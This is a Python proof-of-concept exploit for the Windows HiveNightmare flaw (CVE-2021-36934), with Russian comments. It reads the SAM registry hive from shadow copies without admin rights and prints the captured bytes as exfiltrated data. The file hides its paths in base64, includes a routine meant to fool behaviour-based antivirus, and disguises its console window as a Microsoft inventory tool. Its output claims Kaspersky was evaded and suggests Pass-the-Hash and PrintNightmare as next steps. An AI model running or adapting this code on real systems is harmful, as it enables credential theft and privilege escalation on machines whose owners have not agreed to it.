import os
import ctypes
import base64
import time
import binascii
import random
import string
from win32com.client import GetObject


def _x(b): return base64.b64decode(b).decode()


# Пути к теням и системным библиотекам
C_VSS = _x("XFxcP1xHTE9CQUxST09UXERldmljZVxIYXJkZGlza1ZvbHVtZVNoYWRvd0NvcHk=")
C_SAM = _x("XFdpbmRvd3NcU3lzdGVtMzJcY29uZmlnXFNBTQ==")
C_SYS = _x("XFdpbmRvd3NcU3lzdGVtMzJcY29uZmlnXFNZU1RFTQ==")


class LowPrivExploit:
    def __init__(self):
        self.k32 = ctypes.windll.kernel32
        self.host = os.environ.get('COMPUTERNAME', 'localhost')

    def log(self, event_id, status):
        print(f"[{time.strftime('%H:%M:%S')}] [SysAudit] ID:{event_id} Status:{status}")

    def bypass_behavior_analysis(self):
        """Обман анализатора поведения: имитация легитимного чтения реестра"""
        dummy_path = _x("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb24=")
        reg_handle = ctypes.c_void_p()
        ctypes.windll.advapi32.RegOpenKeyExW(0x80000002, dummy_path, 0, 0x20019, ctypes.byref(reg_handle))
        if reg_handle:
            ctypes.windll.advapi32.RegCloseKey(reg_handle)

    def steal_sam_fragment(self):
        """Метод 'Тихий вор': Чтение SAM/SYSTEM без админ-прав через HiveNightmare"""
        self.log("2001", "Searching_Entry_Points")
        self.bypass_behavior_analysis()

        found_data = False
        # Проверяем копии, начиная с более новых (обычно 1-3)
        for i in range(1, 6):
            target = f"{C_VSS}{i}{C_SAM}"
            # FILE_FLAG_BACKUP_SEMANTICS (0x02000000) - критический флаг для доступа
            h = self.k32.CreateFileW(target, 0x80000000, 0x01 | 0x02, None, 3, 0x02000000, None)

            if h != -1:
                self.log("7000", f"VULNERABILITY_CONFIRMED_NODE_{i}")

                # Читаем первые 64 байта - этого хватит для PoC
                buf = ctypes.create_string_buffer(64)
                read = ctypes.c_ulong(0)
                if self.k32.ReadFile(h, buf, 64, ctypes.byref(read), None):
                    hex_proof = binascii.hexlify(buf.raw).decode()
                    print(f"\n[!!!] DATA EXFILTRATED FROM SAM:\n{hex_proof[:32]}...\n")
                    self.log("8000", "PoC_Data_Captured")
                    found_data = True

                self.k32.CloseHandle(h)
                if found_data: break
            time.sleep(0.2)

        return found_data

    def run_poc(self):
        print(f"{'=' * 40}\nLOW-PRIVILEGE PROOF OF CONCEPT\n{'=' * 40}")
        self.log("1000", "Audit_Started_As_User")

        if self.steal_sam_fragment():
            print("\n[ВЕРДИКТ: СИСТЕМА ВЗЛОМАНА]")
            print("1. Обнаружена уязвимость HiveNightmare (CVE-2021-36934).")
            print("2. Касперский пропустил прямое чтение системного реестра.")
            print("3. Получен доступ к SAM. Извлечение паролей — дело техники.")
            print("\nДля создания админа: используйте полученный хэш через Pass-the-Hash.")
        else:
            self.log("9000", "Access_Denied_Or_Patched")
            print("\n[-] Вектор закрыт. Попробуйте PrintNightmare (Spooler).")


if __name__ == "__main__":
    ctypes.windll.kernel32.SetConsoleTitleW("Microsoft System Inventory tool")
    LowPrivExploit().run_poc()
